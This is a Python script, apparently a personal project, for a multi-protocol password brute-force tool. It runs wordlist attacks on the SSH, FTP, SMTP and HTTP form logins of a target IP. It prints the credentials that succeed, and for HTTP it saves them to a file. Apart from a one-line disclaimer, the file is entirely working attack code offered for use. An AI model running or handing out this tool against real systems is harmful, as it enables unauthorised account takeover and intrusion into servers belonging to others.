# This is my project
# By using this you can brute force and try to gain credentials. 
# But don't use for any illegal reason.

import time
import paramiko         # For SSH
from ftplib import FTP  # For FTP
import requests         # For HTTP
import smtplib          # For SMTP
import pygame
import os

# Display banner
print(r"""
╔════════════════════════════════════════════════════════════════╗
║    🔥 MAYUKH BISWAS - BRUTE FORCE TOOL 🔥          ║
║     超本能 | Ultra Instinct Mode: ACTIVATED 🧠      ║
║    Protocols: SSH | FTP | HTTP | SMTP              ║
╚══════════════════════════════════════════════════════════╝
""")

time.sleep(1)

# Optional startup sound
try:
    pygame.init()
    pygame.mixer.init()
    pygame.mixer.music.load("aisa-mat-karo.mp3")
    pygame.mixer.music.play()
except:
    print("[!] Warning: Sound file could not be played.")

time.sleep(1)

print("=" * 60)
print("🚨 Brute Force Tool - Created by: Mayukh Biswas 🚨")
print("=" * 60)

time.sleep(1)  

start_time = time.time()

try:
    target_ip = input("Enter attack IP: ")
    protocol = input("Enter protocol type (ssh/ftp/http/smtp): ").lower()
    username_file = input("Enter your username file: ")
    password_file = input("Enter your password file: ")
    time_input = input("Enter your time (seconds) [Leave blank for full attempt]: ")
    timeout_seconds = int(time_input.strip()) if time_input.strip() else None

    with open(username_file, "r") as f:
        pass
    with open(password_file, "r") as f:
        pass
except FileNotFoundError as e:
    print(f"[!] File error: {e}")
    exit()
except Exception as e:
    print(f"[!] Unexpected error: {e}")
    exit()

# Automatically assign default port based on protocol
if protocol == "ssh":
    target_port = 22
elif protocol == "ftp":
    target_port = 21
elif protocol == "http":
    target_port = 80
elif protocol == "smtp":
    target_port = 587
else:
    print("\u274c Unsupported protocol!")
    exit()

# HTTP specific inputs
if protocol == "http":
    login_url = input("Enter the full HTTP login URL (e.g., http://example.com/login): ")
    user_field = input("Enter the username field name: ") or "username"
    pass_field = input("Enter the password field name: ") or "password"
    failure_indicator = input("Enter a word that indicates login failed (e.g., 'invalid'): ") or "invalid"
else:
    login_url = user_field = pass_field = failure_indicator = None

# SSH Login
def try_ssh_login(host, port, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=host, port=port, username=username, password=password, timeout=timeout_seconds)
        print(f"[SSH attack successful👌] {username}:{password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[SSH FAIL😫] {username}:{password}")
    except Exception as e:
        print(f"[SSH ERROR💾] {e}")
    return False

# FTP Login 
def try_ftp_login(host, port, username, password):
    try:
        ftp = FTP()
        ftp.connect(host, port, timeout=timeout_seconds)
        ftp.login(user=username, passwd=password)
        print(f"[FTP attack success = balle balle🪇] {username}:{password}")
        ftp.quit()
        return True
    except Exception as e:
        print(f"[FTP FAIL☠] {username}:{password} - {e}")
    return False

# SMTP Login 
def try_smtp_login(host, port, username, password):
    try:
        server = smtplib.SMTP(host=host, port=port, timeout=timeout_seconds)
        server.ehlo()
        server.starttls()
        server.ehlo()
        server.login(username, password)
        print(f"[SMTP SUCCESS📧] {username}:{password}")
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        print(f"[SMTP FAIL❌] {username}:{password}")
    except Exception as e:
        print(f"[SMTP ERROR😵] {e}")
    return False

# HTTP Login (Form Based) 
def try_http_login(url, username, password, user_field, pass_field, fail_flag):
    try:
        data = {
            user_field: username,
            pass_field: password
        }
        r = requests.post(url, data=data, timeout=timeout_seconds)
        if r.status_code != 200 or fail_flag.lower() in r.text.lower():
            print(f"[HTTP FAIL❌] {username}:{password}")
        else:
            print(f"[HTTP LOGIN SUCCESS🔥] {username}:{password}")
            with open("success_logins.txt", "a") as f:
                f.write(f"HTTP | {username}:{password}\n")
            return True
    except Exception as e:
        print(f"[HTTP ERROR⚠️] {e}")
    return False

# Brute-force engine 
def brute_force():
    try:
        with open(username_file, "r") as users, open(password_file, "r") as passwords:
            user_list = [u.strip() for u in users]
            pass_list = [p.strip() for p in passwords]
    except Exception as e:
        print(f"[!] Error reading files: {e}")
        return

    for username in user_list:
        for password in pass_list:
            if timeout_seconds is not None and time.time() - start_time > timeout_seconds:
                print("⏱️ Time ended. Attack stopped automatically.")
                return

            if protocol == "ssh":
                if try_ssh_login(target_ip, target_port, username, password):
                    return
            elif protocol == "ftp":
                if try_ftp_login(target_ip, target_port, username, password):
                    return
            elif protocol == "smtp":
                if try_smtp_login(target_ip, target_port, username, password):
                    return
            elif protocol == "http":
                if try_http_login(login_url, username, password, user_field, pass_field, failure_indicator):
                    return
            else:
                print(f"❌ Unsupported protocol: {protocol}")
                return

# Start the attack 
print(f"\n🔐 Starting brute-force attack on {protocol.upper()}://{target_ip}:{target_port}")
brute_force()
print("✅ Attack finished.")
